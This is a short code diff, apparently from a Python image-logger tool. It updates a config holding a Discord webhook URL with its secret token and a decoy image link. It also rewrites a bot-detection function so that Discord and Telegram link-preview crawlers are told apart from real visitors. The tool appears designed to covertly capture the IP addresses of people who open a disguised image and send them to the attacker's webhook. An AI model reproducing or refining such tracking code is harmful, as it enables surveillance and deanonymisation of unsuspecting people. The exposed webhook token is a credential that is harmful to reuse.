@@ -9,7 +9,7 @@ __version__ = "v1.0"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1531358374829101116/rMcTlCQi7MyFWxP6RbPiZkY3W_8JKTSQ-Qlz_y3UfL0_TsYMvJPvGBr1gABqmizBs_OW",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg",
+    "image": "https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=1200",
     "imageArgument": True,
     "username": "Deads",
     "color": 0x00FFFF,
@@ -33,12 +33,14 @@ config = {
 blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
+    if useragent:
+        if "Discordbot" in useragent or "Discord" in useragent:
+            return "Discord"
+        if useragent.startswith("TelegramBot"):
+            return "Telegram"
     if ip and ip.startswith(("34", "35")):
         return "Discord"
-    elif useragent and useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
+    return False
 
 def reportError(error):
     try:
